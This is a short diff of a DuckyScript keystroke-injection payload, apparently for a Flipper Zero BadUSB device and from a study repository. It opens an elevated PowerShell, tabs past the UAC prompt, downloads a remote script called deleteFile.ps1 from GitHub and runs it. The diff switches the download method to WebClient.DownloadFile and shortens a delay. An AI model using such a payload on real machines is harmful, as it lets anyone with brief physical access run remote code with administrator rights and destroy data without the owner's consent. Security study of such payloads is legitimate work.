@@ -11,12 +11,12 @@ STRING powershell Start-Process powershell -Verb runAs
 ENTER
 DELAY 1500
 SHIFT TAB
-DELAY 1500
+DELAY 500
 ENTER
 DELAY 1500
 
 REM Downloading the deleteFile.ps1 from GitHub and running it
-STRING Invoke-Webrequest -URI 'https://github.com/aenslei/flipperZero-studies/blob/main/Powershell/deleteFile.ps1' -OutFile '.\deleteFile.ps1'
+STRING New-Object System.Net.WebClient .DownloadFile('https://github.com/aenslei/flipperZero-studies/blob/main/Powershell/deleteFile.ps1', '.\deleteFile.ps1')
 ENTER
 STRING .\deleteFile.ps1
 ENTER
